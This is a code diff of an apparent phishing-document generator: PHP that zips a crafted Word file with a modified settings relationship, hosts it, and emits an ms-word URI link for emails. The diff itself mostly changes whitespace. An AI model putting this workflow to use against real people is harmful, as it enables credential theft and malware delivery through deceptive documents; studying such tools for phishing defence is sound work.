@@ -448,8 +448,8 @@ $cmd16 = "sudo sudo zip -r Phishing.docx word/_rels/settings.xml.rels";
 exec($cmd16);
 
 $cmd17 = "sudo cp Phishing.docx hosted/".$uniqid.".docx";
-exec($cmd17);
-
+exec($cmd17);    
+    
 }
 
 $DocName = $uniqid.".docx";
@@ -462,7 +462,7 @@ $DocName = $uniqid.".docx";
 <button class="btn" style="width:25%" type="submit"><i class="fa fa-download"></i> Download</button>
 </form><BR>
 <FONT COLOR="#FFFFFF"><H2>OR</H2><br>Use a Hyperlink and Host the Document Here</FONT><BR><BR>
-<?php
+<?php 
 $urischemelink = "<a href=\"ms-word:ofv|u|".$APIDomain."/phishingdocs/hosted/".$DocName."\">YOUR HYPERLINK TEXT</a>";
 echo "<textarea class=\"js-emaillink\">".htmlspecialchars($urischemelink)."</textarea>";
 ?>
@@ -470,26 +470,26 @@ echo "<textarea class=\"js-emaillink\">".htmlspecialchars($urischemelink)."</tex
 <p><button class="js-emailcopybtn btn" style="width:25%">Copy to Clipboard</button></p>
 
 <script>
-var copyEmailBtn = document.querySelector('.js-emailcopybtn');
-copyEmailBtn.addEventListener('click', function(event) {
-  // Select the email link anchor text
-  var emailLink = document.querySelector('.js-emaillink');
-  var range = document.createRange();
-  range.selectNode(emailLink);
-  window.getSelection().addRange(range);
+var copyEmailBtn = document.querySelector('.js-emailcopybtn');  
+copyEmailBtn.addEventListener('click', function(event) {  
+  // Select the email link anchor text  
+  var emailLink = document.querySelector('.js-emaillink');  
+  var range = document.createRange();  
+  range.selectNode(emailLink);  
+  window.getSelection().addRange(range);  
 
-  try {
-    // Now that we've selected the anchor text, execute the copy command
-    var successful = document.execCommand('copy');
-    var msg = successful ? 'successful' : 'unsuccessful';
-    console.log('Copy email command was ' + msg);
-  } catch(err) {
-    console.log('Oops, unable to copy');
-  }
+  try {  
+    // Now that we've selected the anchor text, execute the copy command  
+    var successful = document.execCommand('copy');  
+    var msg = successful ? 'successful' : 'unsuccessful';  
+    console.log('Copy email command was ' + msg);  
+  } catch(err) {  
+    console.log('Oops, unable to copy');  
+  }  
 
   // Remove the selections - NOTE: Should use
-  // removeRange(range) when it is supported
-  window.getSelection().removeAllRanges();
+  // removeRange(range) when it is supported  
+  window.getSelection().removeAllRanges();  
 });
 </script>
 
@@ -500,7 +500,7 @@ copyEmailBtn.addEventListener('click', function(event) {
 else {
 // If the API Isn't Receiving Requests from a Doc Already, Display Form to Create One
 ?>
-<FORM METHOD="POST"  ACTION="<?php $_SERVER["PHP_SELF"]; ?>" enctype="multipart/form-data">
+<FORM METHOD="POST" ACTION="<?php echo $_SERVER["PHP_SELF"]; ?>" enctype="multipart/form-data">
 <CENTER><br>
 <FONT COLOR="#ffffff"><H1>Create a Phishing Word Doc</H1></FONT><br>
 <TABLE>
